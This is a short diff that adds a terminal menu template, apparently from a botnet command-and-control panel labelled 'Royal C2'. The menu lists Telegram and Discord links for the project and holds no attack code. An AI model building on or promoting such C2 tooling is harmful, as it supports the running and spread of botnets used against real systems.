@@ -1,0 +1,14 @@
+<<clear()>>
+<<full_screen_custom(73x27)>>
+
+  ├─ [38;5;45m<<$cnc_name>>[38;5;45m SOCIAL LINKS[0m
+  │
+  ├─ [38;5;45mTELEGRAM[38;5;255m
+  │   ├── <<$cnc_name>>       [38;5;046m:[38;5;255m t.me/<<$cnc_name>>
+  │   ├── RoyalSRC       [38;5;046m:[38;5;255m https://Royalprojets.com
+  │   └── Royal Projets  [38;5;046m:[38;5;255m https://Royalprojets.com
+  ├─ [38;5;45mDISCORD[38;5;255m
+  │   └── Royal C2       [38;5;046m:[38;5;255m https://Royalprojets.com
+  └─ [38;5;226mCredits[38;5;255m
+      └── Use 'credits' for more.
+
